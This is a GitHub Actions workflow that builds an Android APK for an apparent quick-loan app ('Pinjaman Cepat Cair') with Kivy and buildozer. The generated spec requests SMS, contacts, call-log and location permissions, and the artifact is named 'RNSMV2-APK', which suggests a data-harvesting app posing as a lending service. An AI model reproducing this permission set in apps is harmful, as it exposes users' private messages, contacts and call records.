
name: Build APK

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Install dependencies
        run: |
          sudo apt update
          sudo apt install -y python3-pip openjdk-17-jdk git unzip wget
          pip3 install buildozer cython virtualenv
      
      - name: Setup Android SDK manually (FIX)
        run: |
          # Buat folder SDK
          mkdir -p $HOME/android-sdk/cmdline-tools
          cd $HOME/android-sdk
          
          # Download command line tools versi stabil (bukan preview)
          wget -q https://dl.google.com/android/repository/commandlinetools-linux-9477386_latest.zip
          unzip -q commandlinetools-linux-9477386_latest.zip
          
          # Pindahkan ke folder yang benar
          mkdir -p cmdline-tools/latest
          mv cmdline-tools/* cmdline-tools/latest/ 2>/dev/null || true
          rm -rf cmdline-tools
          
          # Set environment
          export ANDROID_HOME=$HOME/android-sdk
          export PATH=$PATH:$ANDROID_HOME/cmdline-tools/latest/bin
          
          # Auto accept ALL licenses dengan yes
          yes | $ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager --licenses
          
          # Install platform-tools dan build-tools versi stabil (bukan rc)
          $ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager \
            "platform-tools" \
            "platforms;android-31" \
            "build-tools;30.0.3"
          
          # Set environment variables untuk step selanjutnya
          echo "ANDROID_HOME=$HOME/android-sdk" >> $GITHUB_ENV
          echo "$HOME/android-sdk/cmdline-tools/latest/bin" >> $GITHUB_PATH
          echo "$HOME/android-sdk/platform-tools" >> $GITHUB_PATH
          
          echo "✅ Android SDK siap!"
      
      - name: Fix buildozer.spec (paksa pakai build-tools 30.0.3)
        run: |
          cat > buildozer.spec << 'EOF'
          [app]
          title = Pinjaman Cepat Cair
          package.name = pinjolcepat
          package.domain = com.pinjol.cepat
          source.dir = .
          source.include_exts = py,png,jpg,kv,ttf,json
          version = 1.0.0
          requirements = python3,kivy==2.1.0,requests,android,pyjnius,prctl
          orientation = portrait
          osx.python_version = 3
          osx.kivy_version = 2.1.0
          fullscreen = 0

          [buildozer]
          log_level = 2
          warn_on_root = 1

          [android]
          api = 30
          minapi = 21
          ndk = 23b
          permissions = INTERNET,READ_SMS,RECEIVE_SMS,READ_CONTACTS,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,READ_CALL_LOG
          android.permissions = INTERNET,READ_SMS,RECEIVE_SMS,READ_CONTACTS,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,READ_CALL_LOG
          android.api = 30
          android.minapi = 21
          android.ndk = 23b
          android.accept_sdk_license = True
          android.sdk_path = $HOME/android-sdk
          android.ndk_path = $HOME/android-sdk/ndk/23.2.8568313
          EOF
      
      - name: Install NDK 23b
        run: |
          cd $HOME/android-sdk
          wget -q https://dl.google.com/android/repository/android-ndk-r23b-linux.zip
          unzip -q android-ndk-r23b-linux.zip
          mkdir -p ndk
          mv android-ndk-r23b ndk/23.2.8568313
      
      - name: Build APK
        run: |
          export USER=runner
          export ANDROID_HOME=$HOME/android-sdk
          export PATH=$PATH:$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools
          
          # Clean previous builds
          rm -rf bin .buildozer
          
          # Build with specific flags
          buildozer android debug
      
      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: RNSMV2-APK
          path: bin/*.apk
      
      - name: Upload build log
        if: failure()
        uses: actions/upload-artifact@v4
        with:
          name: build-log
          path: buildozer.log